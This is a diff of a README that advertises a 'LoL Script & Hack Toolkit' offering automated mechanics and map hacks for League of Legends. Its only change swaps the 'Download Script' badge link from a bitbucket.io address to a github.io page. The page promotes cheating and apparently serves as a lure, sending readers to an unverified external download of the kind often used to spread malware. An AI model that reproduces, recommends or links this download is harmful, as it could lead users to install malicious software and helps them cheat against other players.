@@ -6,7 +6,7 @@
 
 Welcome to the ultimate **LoL Script & Hack Toolkit** — a fusion of **automated mechanics** and **map hacks** that gives you full control over what happens on the Rift. Whether you're trying to climb fast, hit your skillshots perfectly, or play like a smurf without the grind, this setup delivers.
 
-[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://fileoffload16.bitbucket.io)
+[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://LoL-Script-Hack-dify.github.io/.github)
 ---
 
 ## 🧠 Script Features
